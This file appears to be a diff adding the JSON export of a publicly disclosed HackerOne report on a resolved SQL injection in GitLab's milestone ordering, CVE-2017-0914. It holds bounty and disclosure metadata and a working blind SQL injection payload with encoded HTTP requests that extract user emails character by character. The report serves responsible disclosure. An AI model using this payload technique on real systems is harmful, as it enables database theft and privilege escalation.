@@ -1,0 +1,338 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-04-25T23:41:53.335Z", 
+    "voters": [
+        "jokebookservice1", 
+        "sp1d3rs", 
+        "bull", 
+        "jobert", 
+        "michiel", 
+        "spam404", 
+        "europa", 
+        "ramsexy", 
+        "bhavukjain1", 
+        "glc", 
+        "and 25 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "2000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 298176, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-04-27T02:20:24.222Z", 
+    "vulnerability_information": "The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the `Groups::MilestonesController`. When the **index** action is requested, the `milestones` method is called. Here's the first two lines of the method:\n\n**app/controllers/groups/milestones_controller.rb**\n```ruby\ndef milestones\n    search_params = params.merge(group_ids: group.id)\n\n    milestones = MilestonesFinder.new(search_params).execute\n    # ...\n```\n\nThis code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the `execute` method. Here's the method:\n\n**app/finders/milestone_finder.rb**\n```ruby\n  def execute\n    return Milestone.none if project_ids.empty? && group_ids.empty?\n\n    items = Milestone.all\n    items = by_groups_and_projects(items)\n    items = by_title(items)\n    items = by_state(items)\n\n    order(items)\n  end\n```\n\nThe `order` call on the last line is implemented as following: \n\n**app/finders/milestone_finder.rb**\n```ruby\n def order(items)\n    if params.has_key?(:order)\n      items.reorder(params[:order])\n    else\n      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')\n      items.reorder(order_statement)\n    end\n  end\n```\n\nAs can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:\n\n**Request**\n```\nGET /groups/my-test-group/-/milestones HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response**\n```json\n[\n  {\n    \"title\": \"3\",\n    \"name\": \"3\",\n    \"id\": 429944\n  },\n  {\n    \"title\": \"4\",\n    \"name\": \"4\",\n    \"id\": 429943\n  }\n]\n```\n\nThen, consider the following SQL injection payload:\n\n```sql\n(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)\n```\n\nThis payload does three things: it fetches the `email` column from the `users` table where the `username` matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the `email` (the `SUBSTR(<>, 1, 1)` call) and compares that to a `a`. If that's the case, it'll compare the `id` of the current milestone to `429944`. If that is true, it'll sort on column number 2. If that is **not** the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character `a`.\n\nTo prepare the payload, replace `429944` in the payload with a milestone ID of your account and URL encode it:\n\n**Encoded payload**\n```\n%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29\n```\n\nNow submit the first request:\n\n**Request 1 (`a`)**\n```\nGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response 1**\n```\nHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\"title\":\"3\",\"name\":\"3\",\"id\":429944},{\"title\":\"4\",\"name\":\"4\",\"id\":429943}]\n```\n\nIn the response above the milestones are sorted **descending** based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter `j`, the following behavior is observer:\n\n**Request 2 (`j`)**\n```\nGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response 2**\n```\nHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\"title\":\"4\",\"name\":\"4\",\"id\":429943},{\"title\":\"3\",\"name\":\"3\",\"id\":429944}]\n```\n\nBecause the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` function can be changed to guess characters on other positions of the value.\n\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\n\n## Impact\n\nAn attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "low", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.9, 
+        "author_type": "User"
+    }, 
+    "title": "SQL injection in MilestoneFinder order method", 
+    "is_member_of_team?": null, 
+    "vote_count": 35, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-05-25T23:41:53.426Z", 
+    "state": "Closed", 
+    "cve_ids": [
+        "CVE-2017-0914"
+    ], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$2,000", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-15T04:40:45.904Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-15T04:40:45.904Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Hi Jobert,\n\nThank you for highlighting and detailing this SQL injection vulnerability. We will immediately begin triaging and investigating this finding with our engineering and production teams. Based on current workloads, we expect that we will have a further response for you within the next 2 business days.\n\nRegards,\nGitLab Security Team", 
+            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>Thank you for highlighting and detailing this SQL injection vulnerability. We will immediately begin triaging and investigating this finding with our engineering and production teams. Based on current workloads, we expect that we will have a further response for you within the next 2 business days.</p>\n\n<p>Regards,<br>\nGitLab Security Team</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2224873, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-12-18T21:18:34.776Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-18T21:18:34.776Z", 
+            "actor": {
+                "url": "/gitlab", 
+                "profile": {
+                    "name": "GitLab"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
+                }
+            }, 
+            "team_handle": "gitlab", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "2000.0", 
+            "collaborator": {
+                "username": "jobert", 
+                "url": "/jobert"
+            }, 
+            "message": "Hi Jobert,\n\nCongratulations! Due to your detailed findings report #298176, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability. \n\nWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\n\nRegards,\nGitLab Security Team", 
+            "markdown_message": "<p>Hi Jobert,</p>\n\n<p>Congratulations! Due to your detailed findings report <a href=\"/reports/298176\">#298176</a>, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability. </p>\n\n<p>We certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!</p>\n\n<p>Regards,<br>\nGitLab Security Team</p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2232851, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-18T22:26:40.626Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-18T22:26:40.626Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "Amazing, thanks @kathyw!", 
+            "markdown_message": "<p>Amazing, thanks <a href=\"/kathyw\">@kathyw</a>!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2233047, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-22T05:18:42.250Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-22T05:18:42.250Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2241811, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "jobert", 
+                "url": "/jobert"
+            }, 
+            "created_at": "2017-12-22T05:19:15.333Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-22T05:19:15.333Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2241812, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-25T23:41:53.375Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-25T23:41:53.375Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2665588, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-27T02:20:24.251Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-27T02:20:24.251Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2670828, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-27T02:20:24.611Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-27T02:20:24.611Z", 
+            "actor": {
+                "username": "kathyw", 
+                "url": "/kathyw", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "gitlab", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2670829, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "jobert", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/jobert", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/002/15c798072d48f06507cde4b11352a3338ae973fc_small.png?1410255083"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 67, 
+        "name": "SQL Injection"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -16843374.482241943, 
+    "disclosed_at": "2018-04-27T02:20:24.581Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/298176", 
+    "created_at": "2017-12-15T03:15:38.095Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>The <code>MilestoneFinder</code> is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the <code>Groups::MilestonesController</code>. When the <strong>index</strong> action is requested, the <code>milestones</code> method is called. Here&#39;s the first two lines of the method:</p>\n\n<p><strong>app/controllers/groups/milestones_controller.rb</strong></p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">milestones</span>\n    <span class=\"n\">search_params</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">.</span><span class=\"nf\">merge</span><span class=\"p\">(</span><span class=\"ss\">group_ids: </span><span class=\"n\">group</span><span class=\"p\">.</span><span class=\"nf\">id</span><span class=\"p\">)</span>\n\n    <span class=\"n\">milestones</span> <span class=\"o\">=</span> <span class=\"no\">MilestonesFinder</span><span class=\"p\">.</span><span class=\"nf\">new</span><span class=\"p\">(</span><span class=\"n\">search_params</span><span class=\"p\">).</span><span class=\"nf\">execute</span>\n    <span class=\"c1\"># ...</span>\n</code></pre>\n<p>This code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the <code>execute</code> method. Here&#39;s the method:</p>\n\n<p><strong>app/finders/milestone_finder.rb</strong></p>\n<pre class=\"highlight ruby\"><code>  <span class=\"k\">def</span> <span class=\"nf\">execute</span>\n    <span class=\"k\">return</span> <span class=\"no\">Milestone</span><span class=\"p\">.</span><span class=\"nf\">none</span> <span class=\"k\">if</span> <span class=\"n\">project_ids</span><span class=\"p\">.</span><span class=\"nf\">empty?</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">group_ids</span><span class=\"p\">.</span><span class=\"nf\">empty?</span>\n\n    <span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"no\">Milestone</span><span class=\"p\">.</span><span class=\"nf\">all</span>\n    <span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"n\">by_groups_and_projects</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">)</span>\n    <span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"n\">by_title</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">)</span>\n    <span class=\"n\">items</span> <span class=\"o\">=</span> <span class=\"n\">by_state</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">)</span>\n\n    <span class=\"n\">order</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">)</span>\n  <span class=\"k\">end</span>\n</code></pre>\n<p>The <code>order</code> call on the last line is implemented as following: </p>\n\n<p><strong>app/finders/milestone_finder.rb</strong></p>\n<pre class=\"highlight ruby\"><code> <span class=\"k\">def</span> <span class=\"nf\">order</span><span class=\"p\">(</span><span class=\"n\">items</span><span class=\"p\">)</span>\n    <span class=\"k\">if</span> <span class=\"n\">params</span><span class=\"p\">.</span><span class=\"nf\">has_key?</span><span class=\"p\">(</span><span class=\"ss\">:order</span><span class=\"p\">)</span>\n      <span class=\"n\">items</span><span class=\"p\">.</span><span class=\"nf\">reorder</span><span class=\"p\">(</span><span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:order</span><span class=\"p\">])</span>\n    <span class=\"k\">else</span>\n      <span class=\"n\">order_statement</span> <span class=\"o\">=</span> <span class=\"no\">Gitlab</span><span class=\"o\">::</span><span class=\"no\">Database</span><span class=\"p\">.</span><span class=\"nf\">nulls_last_order</span><span class=\"p\">(</span><span class=\"s1\">&#39;due_date&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;ASC&#39;</span><span class=\"p\">)</span>\n      <span class=\"n\">items</span><span class=\"p\">.</span><span class=\"nf\">reorder</span><span class=\"p\">(</span><span class=\"n\">order_statement</span><span class=\"p\">)</span>\n    <span class=\"k\">end</span>\n  <span class=\"k\">end</span>\n</code></pre>\n<p>As can be seen on line 2 of the method, <code>reorder</code> is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here&#39;s a request example:</p>\n\n<p><strong>Request</strong></p>\n<pre class=\"highlight plaintext\"><code>GET /groups/my-test-group/-/milestones HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n</code></pre>\n<p><strong>Response</strong></p>\n<pre class=\"highlight json\"><code><span class=\"p\">[</span><span class=\"w\">\n  </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;title&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;3&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;3&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">429944</span><span class=\"w\">\n  </span><span class=\"p\">},</span><span class=\"w\">\n  </span><span class=\"p\">{</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;title&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;4&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;name&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"s2\">&quot;4&quot;</span><span class=\"p\">,</span><span class=\"w\">\n    </span><span class=\"s2\">&quot;id&quot;</span><span class=\"p\">:</span><span class=\"w\"> </span><span class=\"mi\">429943</span><span class=\"w\">\n  </span><span class=\"p\">}</span><span class=\"w\">\n</span><span class=\"p\">]</span><span class=\"w\">\n</span></code></pre>\n<p>Then, consider the following SQL injection payload:</p>\n<pre class=\"highlight sql\"><code><span class=\"p\">(</span><span class=\"k\">CASE</span> <span class=\"n\">SUBSTR</span><span class=\"p\">((</span><span class=\"k\">SELECT</span> <span class=\"n\">email</span> <span class=\"k\">FROM</span> <span class=\"n\">users</span> <span class=\"k\">WHERE</span> <span class=\"n\">username</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;jobertabma&#39;</span><span class=\"p\">),</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"k\">WHEN</span> <span class=\"s1\">&#39;a&#39;</span> <span class=\"k\">THEN</span> <span class=\"p\">(</span><span class=\"k\">CASE</span> <span class=\"n\">id</span> <span class=\"k\">WHEN</span> <span class=\"mi\">429944</span> <span class=\"k\">THEN</span> <span class=\"mi\">2</span> <span class=\"k\">ELSE</span> <span class=\"mi\">1</span> <span class=\"k\">END</span><span class=\"p\">)</span> <span class=\"k\">ELSE</span> <span class=\"mi\">1</span> <span class=\"k\">END</span><span class=\"p\">)</span>\n</code></pre>\n<p>This payload does three things: it fetches the <code>email</code> column from the <code>users</code> table where the <code>username</code> matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the <code>email</code> (the <code>SUBSTR(&lt;&gt;, 1, 1)</code> call) and compares that to a <code>a</code>. If that&#39;s the case, it&#39;ll compare the <code>id</code> of the current milestone to <code>429944</code>. If that is true, it&#39;ll sort on column number 2. If that is <strong>not</strong> the case, it&#39;ll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character <code>a</code>.</p>\n\n<p>To prepare the payload, replace <code>429944</code> in the payload with a milestone ID of your account and URL encode it:</p>\n\n<p><strong>Encoded payload</strong></p>\n<pre class=\"highlight plaintext\"><code>%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29\n</code></pre>\n<p>Now submit the first request:</p>\n\n<p><strong>Request 1 (<code>a</code>)</strong></p>\n<pre class=\"highlight plaintext\"><code>GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&amp;&amp;order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n</code></pre>\n<p><strong>Response 1</strong></p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: nginx\n...\n\n[{&quot;title&quot;:&quot;3&quot;,&quot;name&quot;:&quot;3&quot;,&quot;id&quot;:429944},{&quot;title&quot;:&quot;4&quot;,&quot;name&quot;:&quot;4&quot;,&quot;id&quot;:429943}]\n</code></pre>\n<p>In the response above the milestones are sorted <strong>descending</strong> based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter <code>j</code>, the following behavior is observer:</p>\n\n<p><strong>Request 2 (<code>j</code>)</strong></p>\n<pre class=\"highlight plaintext\"><code>GET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&amp;&amp;order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n</code></pre>\n<p><strong>Response 2</strong></p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: nginx\n...\n\n[{&quot;title&quot;:&quot;4&quot;,&quot;name&quot;:&quot;4&quot;,&quot;id&quot;:429943},{&quot;title&quot;:&quot;3&quot;,&quot;name&quot;:&quot;3&quot;,&quot;id&quot;:429944}]\n</code></pre>\n<p>Because the first character of my email is actually <code>j</code>, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the <code>SUBSTR</code> function can be changed to guess characters on other positions of the value.</p>\n\n<p>This has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>An attacker can extract all information from the a GitLab instance&#39;s database, including private access and shell tokens. These can be used to elevate the user&#39;s privileges, which may lead to arbitrary code execution.</p>\n", 
+    "severity_rating": "critical", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://about.gitlab.com", 
+            "about": "Open source software to collaborate on code", 
+            "twitter_handle": "gitlab", 
+            "name": "GitLab"
+        }, 
+        "handle": "gitlab", 
+        "url": "https://hackerone.com/gitlab", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/264/338ec4b43393873324e3f1911f2f107d025d13f1_small.png?1454722206", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/264/f40e550269de1c8aef9adbdfe728c9aa8163a7e5_medium.png?1454722206"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 264, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
